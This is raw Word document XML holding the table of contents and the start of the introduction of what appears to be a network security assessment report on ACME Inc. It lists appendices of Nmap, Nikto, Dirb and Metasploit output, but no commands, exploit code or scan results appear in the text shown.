                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>32</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="30500779" w14:textId="514ECCD5" w:rsidR="007F6F59" w:rsidRDefault="007F6F59">
          <w:pPr>
            <w:pStyle w:val="TOC3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1200"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="en-US"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc183984565" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>4.1.6</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Unsecure Protocols</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984565 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>33</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="093B763E" w14:textId="5684195A"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66" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>4.2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Physical Network Structure</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984566 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>33</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="4933CE5D" w14:textId="791607C1" w:rsidR="007F6F59" w:rsidRDefault="007F6F59">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="en-US"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc183984567" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Discussion</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984567 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>34</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="63809535" w14:textId="4192C795"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68" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>5.1</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Overall Discussion</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984568 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>34</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="56E900C6" w14:textId="02B3A98E" w:rsidR="007F6F59" w:rsidRDefault="007F6F59">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="960"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="en-US"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc183984569" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>5.2</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
                <w:noProof/>
                <w:kern w:val="2"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:eastAsia="en-US"/>
                <w14:ligatures w14:val="standardContextual"/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidRPr="0092686A">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_Toc183984569 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>34</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="43CF82B2" w14:textId="58A11877" w:rsidR="007F6F59" w:rsidRDefault="007F6F59">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="en-US"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc183984570" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>References</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984570 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>36</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="0AD5CD8B" w14:textId="70463080" w:rsidR="007F6F59" w:rsidRDefault="007F6F59">
          <w:pPr>
            <w:pStyle w:val="TOC1"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="en-US"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc183984571" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Appendices</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984571 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>37</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="473B1008" w14:textId="05942D01" w:rsidR="007F6F59" w:rsidRDefault="007F6F59">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="en-US"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc183984572" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix A – Nmap Scans</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984572 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>37</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="3FE2E822" w14:textId="2F14657F" w:rsidR="007F6F59" w:rsidRDefault="007F6F59">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="en-US"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc183984573" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix B – Nikto Scans</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984573 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>44</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7EF04966" w14:textId="100F4606" w:rsidR="007F6F59" w:rsidRDefault="007F6F59">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="en-US"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc183984574" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix C – Dirb Scans</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984574 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>46</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="633CC138" w14:textId="11AC1BDE" w:rsidR="007F6F59" w:rsidRDefault="007F6F59">
          <w:pPr>
            <w:pStyle w:val="TOC2"/>
            <w:tabs>
              <w:tab w:val="right" w:leader="dot" w:pos="9350"/>
            </w:tabs>
            <w:rPr>
              <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi"/>
              <w:noProof/>
              <w:kern w:val="2"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
              <w:lang w:eastAsia="en-US"/>
              <w14:ligatures w14:val="standardContextual"/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc183984575" w:history="1">
            <w:r w:rsidRPr="0092686A">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
                <w:lang w:eastAsia="en-US"/>
              </w:rPr>
              <w:t>Appendix D – Metasploit Output</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc183984575 \h </w:instrText>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002859A8">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>53</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="779B4F27" w14:textId="2CCD623A" w:rsidR="001905B9" w:rsidRDefault="00404615" w:rsidP="008605B2">
          <w:pPr>
            <w:ind w:right="4"/>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:b/>
              <w:bCs/>
              <w:noProof/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="1C387AD0" w14:textId="77777777" w:rsidR="00A60D20" w:rsidRDefault="00A60D20" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AD37833" w14:textId="77777777" w:rsidR="00C5090A" w:rsidRDefault="00C5090A" w:rsidP="008605B2">
      <w:pPr>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
        </w:rPr>
        <w:sectPr w:rsidR="00C5090A" w:rsidSect="00C5090A">
          <w:footerReference w:type="first" r:id="rId12"/>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/>
          <w:pgNumType w:start="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="299"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DB72581" w14:textId="77777777" w:rsidR="001905B9" w:rsidRDefault="00341658" w:rsidP="008605B2">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc183984542"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Introduction</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="0434D190" w14:textId="25469596" w:rsidR="0001375C" w:rsidRDefault="00341658" w:rsidP="0001375C">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc183984543"/>
      <w:r>
        <w:t>Background</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
      <w:r w:rsidR="0001375C" w:rsidRPr="0001375C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79583263" w14:textId="51545870" w:rsidR="0001375C" w:rsidRPr="003E5D01" w:rsidRDefault="00A46118" w:rsidP="0001375C">
      <w:pPr>
        <w:spacing w:after="236"/>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="00086CBB" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>his report is a complete analysis of the ACME Inc. computing network. The</w:t>
      </w:r>
      <w:r w:rsidR="007E23B6" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> report </w:t>
      </w:r>
      <w:r w:rsidR="00726C2A" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">utilizes several networking tools to conduct a concise overview of the network and its topology.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24FFC993" w14:textId="533ADAD2" w:rsidR="00B23384" w:rsidRPr="003E5D01" w:rsidRDefault="00B23384" w:rsidP="0001375C">
      <w:pPr>
        <w:spacing w:after="236"/>
        <w:ind w:right="4"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">A network diagram and subnet table of the network will be produced in this report alongside </w:t>
      </w:r>
      <w:r w:rsidR="00E54A30" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>information</w:t>
      </w:r>
      <w:r w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00D92710" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">about each host involved in the network.  The security of the network will then be evaluated to </w:t>
      </w:r>
      <w:r w:rsidR="000E4109" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>produce</w:t>
      </w:r>
      <w:r w:rsidR="00D92710" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> an overall analysis on each machine and the security risks associated with them.  Using different tools such as </w:t>
      </w:r>
      <w:r w:rsidR="00361529">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nmap, nikto, dirb,</w:t>
      </w:r>
      <w:r w:rsidR="003B15FE" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and metasploit the tester will map out the network and discover any vulnerabilities </w:t>
      </w:r>
      <w:r w:rsidR="00495438" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>within.</w:t>
      </w:r>
      <w:r w:rsidR="00D92710" w:rsidRPr="003E5D01">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
